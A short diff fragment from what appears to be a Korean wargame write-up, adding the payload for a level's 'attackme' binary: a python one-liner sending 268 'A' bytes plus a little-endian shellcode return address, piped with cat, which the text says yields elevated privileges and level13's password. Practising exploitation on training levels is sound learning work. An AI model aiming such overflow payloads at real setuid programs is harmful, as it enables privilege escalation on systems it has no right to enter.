@@ -161,4 +161,6 @@ gdb를 확인해보면
 쉘 코드 주소 : 0xbffffc1d  
 리틀엔디안 변환 : \x1d\xfc\xff\xbf 
 
-페이로드 : 
+페이로드 : $(python -c'print "A"*268 + "\x1d\xfc\xff\xbf"', cat) | ./attackme  
+를 입력하면 권한이 얻어지고 my-pass로 level13의 패스워드를 확인한다  
+
